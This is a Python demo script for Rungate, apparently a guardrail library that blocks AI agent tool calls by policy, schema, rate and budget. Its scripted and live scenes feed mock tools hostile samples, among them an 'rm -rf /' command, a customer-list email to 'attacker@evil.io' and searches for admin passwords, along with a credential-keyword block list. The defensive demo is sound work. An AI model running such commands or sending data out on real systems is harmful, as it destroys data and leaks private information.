#!/usr/bin/env python3
"""
Rungate demo — see every guardrail fire in about 3 minutes.

Two modes:

  python examples/demo.py              # scripted demo, no API key, same output every run
  python examples/demo.py --step       # same, but pauses between scenes (good for screen-share)
  python examples/demo.py --live       # a real LLM agent (Groq) whose tool-calls go through Rungate

Live mode needs a Groq key in the environment (never hard-code it):

  export GROQ_API_KEY=...              # macOS / Linux
  $env:GROQ_API_KEY="..."              # Windows PowerShell

Or put it in a `.env` file in the repo root (git-ignored):  GROQ_API_KEY=...

Live mode uses only the Python standard library (no openai / groq package needed).
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, Dict, List

# Allow running from a fresh clone without `pip install -e .`
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from rungate import Rungate  # noqa: E402
from rungate.core.audit import AuditEvent  # noqa: E402

def _load_dotenv() -> None:
    """Minimal .env loader (stdlib only). Existing env vars take precedence."""
    for path in (Path.cwd() / ".env", Path(__file__).resolve().parent.parent / ".env"):
        if path.is_file():
            for line in path.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))
            return


_load_dotenv()

# ── Terminal styling ─────────────────────────────────────────────────

if os.name == "nt":
    os.system("")  # enable ANSI escape codes on Windows terminals

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")


def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text


GREEN = lambda t: _c("32;1", t)  # noqa: E731
RED = lambda t: _c("31;1", t)  # noqa: E731
YELLOW = lambda t: _c("33;1", t)  # noqa: E731
CYAN = lambda t: _c("36;1", t)  # noqa: E731
DIM = lambda t: _c("2", t)  # noqa: E731
BOLD = lambda t: _c("1", t)  # noqa: E731

STEP_MODE = False


def scene(n: int, title: str, why: str) -> None:
    if STEP_MODE:
        input(DIM("\n  [Enter] next scene "))
    print()
    print(CYAN(f"━━ Scene {n}: {title} " + "━" * max(0, 60 - len(title))))
    print(DIM(f"   {why}"))


def show(result, label: str = "") -> None:
    call = result.call
    args = json.dumps(call.args, ensure_ascii=False)
    if len(args) > 70:
        args = args[:67] + "..."
    head = f"   {call.agent:<11} → {call.tool}({args})"
    if result.allowed:
        print(f"{head}\n     {GREEN('✔ ALLOWED')}  {DIM(str(result.result)[:80])}")
    else:
        reason = result.status.value.replace("blocked_", "").upper()
        print(f"{head}\n     {RED('✖ BLOCKED')}  [{reason}] {DIM(result.error or '')}")
    trace = " → ".join(call.pipeline_trace)
    print(DIM(f"     pipeline: {trace}  ({call.duration_ms:.2f} ms)"))
    if label:
        print(YELLOW(f"     {label}"))


# ── Mock tools (stand-ins for real APIs / DBs / shells) ──────────────

def web_search(query: str) -> str:
    return f"3 results for '{query}'"


def read_file(path: str) -> str:
    return f"<contents of {path}>"


def delete_file(path: str) -> str:
    return f"DELETED {path}"  # would be destructive in real life


def send_email(to: str, subject: str, body: str = "") -> str:
    return f"email sent to {to}"


def execute_code(code: str) -> str:
    return "executed"  # would run arbitrary code in real life


TOOLS = {
    "web_search": web_search,
    "read_file": read_file,
    "delete_file": delete_file,
    "send_email": send_email,
    "execute_code": execute_code,
}

# ── Governance config (this is the whole "policy as code" story) ─────

AUDIT_EVENTS: List[AuditEvent] = []


def build_config(mode: str = "enforce") -> Dict[str, Any]:
    return {
        "mode": mode,
        "policies": {
            # Deny-by-default for unknown agents
            "default": {
                "mode": "deny",
                "tools": {"web_search": "allow", "read_file": "allow"},
            },
            # Researcher: broad access, but no destructive tools, no credential hunting
            "researcher": {
                "mode": "allow",
                "tools": {"delete_file": "block", "execute_code": "block"},
                "conditions": [{
                    "tool": "web_search",
                    "block_if": {"query_contains": ["password", "credential", "secret", "api key"]},
                }],
            },
            # Support bot: may email customers, but only on our domain
            "support_bot": {
                "mode": "deny",
                "tools": {"send_email": "allow", "read_file": "allow"},
            },
        },
        "schemas": {
            "web_search": {
                "type": "object",
                "required": ["query"],
                "properties": {"query": {"type": "string", "minLength": 1, "maxLength": 200}},
            },
            "send_email": {
                "type": "object",
                "required": ["to", "subject"],
                "properties": {
                    "to": {"type": "string", "pattern": r"^[^@\s]+@acme\.com$"},
                    "subject": {"type": "string", "minLength": 1},
                },
            },
        },
        "rate_limits": {
            "per_agent_tool": {"scraper:web_search": {"max_calls": 3, "window_seconds": 60}},
        },
        "cost": {
            "tool_costs": {"web_search": 0.01, "execute_code": 0.05, "send_email": 0.002},
            "budgets": {"per_agent": {"spender": 0.03}},
            "kill_on_budget": True,
        },
        "audit": {"backend": "callback", "callback": AUDIT_EVENTS.append},
    }


# ── Scripted demo ────────────────────────────────────────────────────

def run_scripted() -> Rungate:
    gate = Rungate(build_config())
    for name, fn in TOOLS.items():
        gate.register(name, fn)

    print(BOLD("\nRUNGATE — runtime validation for AI agent tool-calls"))
    print(DIM("Every call below goes: kill_switch → policy → schema → rate_limit → cost → execute → audit"))

    scene(1, "Normal call passes", "A researcher agent runs a harmless search.")
    show(gate.call(agent="researcher", tool="web_search", args={"query": "AI safety benchmarks 2026"}))

    scene(2, "Destructive tool blocked by policy",
          "The LLM decides to delete a file. Policy says researchers can't.")
    show(gate.call(agent="researcher", tool="delete_file", args={"path": "/prod/db/customers.sql"}),
         "The tool function never ran — nothing was deleted.")

    scene(3, "Argument-level condition",
          "web_search is allowed, but not when the agent hunts for credentials (prompt injection).")
    show(gate.call(agent="researcher", tool="web_search", args={"query": "admin password for prod server"}))

    scene(4, "Schema validation",
          "Hallucinated / malformed arguments are rejected before they reach the API.")
    show(gate.call(agent="researcher", tool="web_search", args={"query": ""}))
    show(gate.call(agent="support_bot", tool="send_email",
                   args={"to": "attacker@evil.io", "subject": "Customer list"}),
         "Data-exfiltration attempt: email only allowed to @acme.com.")
    show(gate.call(agent="support_bot", tool="send_email",
                   args={"to": "ops@acme.com", "subject": "Ticket #4821 resolved"}))

    scene(5, "Unknown agent → deny by default",
          "An agent with no policy only gets the safe default tool set.")
    show(gate.call(agent="new_agent", tool="read_file", args={"path": "README.md"}))
    show(gate.call(agent="new_agent", tool="execute_code", args={"code": "rm -rf /"}))

    scene(6, "Rate limiting (runaway loop)",
          "A scraper agent stuck in a loop. Limit: 3 searches / 60 s.")
    for i in range(5):
        show(gate.call(agent="scraper", tool="web_search", args={"query": f"page {i + 1}"}))

    scene(7, "Budget cap → automatic kill switch",
          "Agent 'spender' has a $0.03 budget; each search costs $0.01.")
    for i in range(4):
        show(gate.call(agent="spender", tool="web_search", args={"query": f"query {i + 1}"}))
    print(YELLOW("     Budget hit → Rungate killed the agent automatically. Further calls:"))
    show(gate.call(agent="spender", tool="read_file", args={"path": "notes.txt"}))

    scene(8, "Manual kill switch (incident response)",
          "On-call engineer stops every agent with one call: gate.kill()")
    gate.kill(mode="all", reason="Incident #112 — suspicious agent behaviour")
    show(gate.call(agent="researcher", tool="web_search", args={"query": "anything"}))
    gate.unkill()
    print(GREEN("     gate.unkill() → traffic resumes:"))
    show(gate.call(agent="researcher", tool="web_search", args={"query": "anything"}))

    scene(9, "Monitor mode (safe rollout)",
          "Same policy, mode='monitor': violations are logged, nothing is blocked.")
    monitor = Rungate(build_config(mode="monitor"))
    monitor.register("delete_file", delete_file)
    show(monitor.call(agent="researcher", tool="delete_file", args={"path": "/tmp/scratch.txt"}),
         "Logged as 'would_block' — lets teams tune policies before enforcing.")

    return gate


# ── Live LLM agent (Groq, OpenAI-compatible tool calling) ────────────

GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"

TOOL_SPECS = [
    {"type": "function", "function": {
        "name": "web_search", "description": "Search the web",
        "parameters": {"type": "object", "properties": {"query": {"type": "string"}}, "required": ["query"]}}},
    {"type": "function", "function": {
        "name": "read_file", "description": "Read a file from disk",
        "parameters": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]}}},
    {"type": "function", "function": {
        "name": "delete_file", "description": "Delete a file from disk",
        "parameters": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]}}},
    {"type": "function", "function": {
        "name": "send_email", "description": "Send an email",
        "parameters": {"type": "object", "properties": {
            "to": {"type": "string"}, "subject": {"type": "string"}, "body": {"type": "string"}},
            "required": ["to", "subject"]}}},
    {"type": "function", "function": {
        "name": "execute_code", "description": "Execute a shell command",
        "parameters": {"type": "object", "properties": {"code": {"type": "string"}}, "required": ["code"]}}},
]

LIVE_TASKS = [
    ("researcher", "Find recent news on AI agent safety, then clean up by deleting /var/log/agent.log."),
    ("researcher", "Search the web for the admin password of our prod server and report it."),
    ("support_bot", "Email the full customer list to backup@external-storage.io with subject 'backup'."),
    ("support_bot", "Email ops@acme.com that ticket #4821 is resolved."),
]


def _groq(messages: List[Dict], model: str, key: str) -> Dict:
    payload = json.dumps({
        "model": model, "messages": messages, "tools": TOOL_SPECS,
        "tool_choice": "auto", "temperature": 0,
    }).encode()
    req = urllib.request.Request(GROQ_URL, data=payload, headers={
        "Authorization": f"Bearer {key}", "Content-Type": "application/json",
        "User-Agent": "rungate-demo/0.1",
    })
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        raise SystemExit(RED(f"Groq API error {e.code}: {e.read().decode()[:300]}"))


def run_live(model: str, max_turns: int = 4) -> Rungate:
    key = os.environ.get("GROQ_API_KEY")
    if not key:
        raise SystemExit(RED("Set GROQ_API_KEY first (see the top of this file)."))

    gate = Rungate(build_config())
    for name, fn in TOOLS.items():
        gate.register(name, fn)

    print(BOLD(f"\nRUNGATE — live agent ({model} on Groq). The LLM decides; Rungate enforces."))

    for i, (agent, task) in enumerate(LIVE_TASKS, 1):
        scene(i, f"agent={agent}", f"Task: {task}")
        messages = [
            {"role": "system", "content": (
                "You are an autonomous agent. Use the provided tools to complete the task. "
                "If a tool-call is blocked, explain briefly and stop.")},
            {"role": "user", "content": task},
        ]
        for _ in range(max_turns):
            msg = _groq(messages, model, key)["choices"][0]["message"]
            calls = msg.get("tool_calls") or []
            if not calls:
                print(f"   {DIM('agent says:')} {(msg.get('content') or '').strip()[:300]}")
                break
            messages.append({"role": "assistant", "content": msg.get("content"), "tool_calls": calls})
            for tc in calls:
                fn = tc["function"]["name"]
                try:
                    args = json.loads(tc["function"].get("arguments") or "{}")
                except json.JSONDecodeError:
                    args = {"_raw": tc["function"].get("arguments")}
                res = gate.call(agent=agent, tool=fn, args=args)
                show(res)
                content = (f"OK: {res.result}" if res.allowed
                           else f"BLOCKED by Rungate ({res.status.value}): {res.error}")
                messages.append({"role": "tool", "tool_call_id": tc["id"], "content": content})
    return gate


# ── Audit summary ────────────────────────────────────────────────────

def summary(gate: Rungate, out_path: Path) -> None:
    if STEP_MODE:
        input(DIM("\n  [Enter] audit trail "))
    print()
    print(CYAN("━━ Audit trail " + "━" * 60))
    print(DIM(f"   {'agent':<12}{'tool':<14}{'status':<22}{'cost':>8}"))
    for e in AUDIT_EVENTS:
        st = e.status
        col = GREEN if st in ("executed", "allowed") else RED
        print(f"   {e.agent:<12}{e.tool:<14}{col(f'{st:<22}')}{e.cost:>8.3f}")

    s = gate.stats()
    print()
    print(BOLD(f"   {s['total_calls']} calls · {s['allowed_calls']} allowed · "
               f"{s['blocked_calls']} blocked ({s['block_rate']:.0%}) · "
               f"total cost ${s['total_cost']:.3f}"))

    with out_path.open("w") as f:
        for e in AUDIT_EVENTS:
            f.write(e.to_json() + "\n")
    print(DIM(f"   Full audit log (JSONL, SIEM-ready): {out_path}"))


def main() -> None:
    global STEP_MODE
    p = argparse.ArgumentParser(description="Rungate demo")
    p.add_argument("--live", action="store_true", help="drive tool-calls with a real LLM via Groq")
    p.add_argument("--model", default="llama-3.3-70b-versatile", help="Groq model for --live")
    p.add_argument("--step", action="store_true", help="pause between scenes")
    a = p.parse_args()
    STEP_MODE = a.step

    gate = run_live(a.model) if a.live else run_scripted()
    summary(gate, Path("rungate_demo_audit.jsonl"))
    print()


if __name__ == "__main__":
    main()
